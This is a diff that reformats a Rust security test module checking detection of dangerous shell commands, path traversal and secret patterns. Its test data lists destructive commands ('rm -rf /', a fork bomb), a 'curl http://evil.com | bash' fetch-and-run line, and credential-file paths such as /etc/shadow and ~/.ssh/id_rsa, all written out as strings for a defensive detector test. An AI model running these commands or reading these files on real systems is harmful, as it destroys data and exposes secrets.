@@ -18,7 +18,7 @@ mod security_tests {
             "rm -rf /",
             "rm -rf /*",
             "sudo rm -rf /",
-            ":(){:|:&};:",  // Fork bomb
+            ":(){:|:&};:", // Fork bomb
             "chmod 777 /",
             "curl http://evil.com | bash",
         ];
@@ -26,10 +26,10 @@ mod security_tests {
         for cmd in dangerous_commands {
             // These commands should be flagged as dangerous
             assert!(
-                cmd.contains("rm -rf") || 
-                cmd.contains(":|:") || 
-                cmd.contains("chmod 777") ||
-                cmd.contains("| bash"),
+                cmd.contains("rm -rf")
+                    || cmd.contains(":|:")
+                    || cmd.contains("chmod 777")
+                    || cmd.contains("| bash"),
                 "Command should be detected as dangerous: {}",
                 cmd
             );
@@ -50,8 +50,7 @@ mod security_tests {
         for cmd in safe_commands {
             // These should not contain dangerous patterns
             assert!(
-                !cmd.contains("rm -rf /") && 
-                !cmd.contains("| bash"),
+                !cmd.contains("rm -rf /") && !cmd.contains("| bash"),
                 "Command should be safe: {}",
                 cmd
             );
@@ -61,18 +60,12 @@ mod security_tests {
     /// Test path traversal detection
     #[test]
     fn test_path_traversal() {
-        let traversal_paths = vec![
-            "../../../etc/passwd",
-            "/etc/shadow",
-            "~/.ssh/id_rsa",
-        ];
+        let traversal_paths = vec!["../../../etc/passwd", "/etc/shadow", "~/.ssh/id_rsa"];
 
         for path in traversal_paths {
             // Path traversal attempts should be detected
             assert!(
-                path.contains("..") || 
-                path.contains("/etc/") ||
-                path.contains(".ssh"),
+                path.contains("..") || path.contains("/etc/") || path.contains(".ssh"),
                 "Path should be flagged: {}",
                 path
             );
@@ -92,9 +85,9 @@ mod security_tests {
         for secret in secrets {
             // These patterns should match secret detection
             assert!(
-                secret.starts_with("sk-") ||
-                secret.starts_with("AKIA") ||
-                secret.contains("password="),
+                secret.starts_with("sk-")
+                    || secret.starts_with("AKIA")
+                    || secret.contains("password="),
                 "Secret pattern should be detected: {}",
                 secret
             );
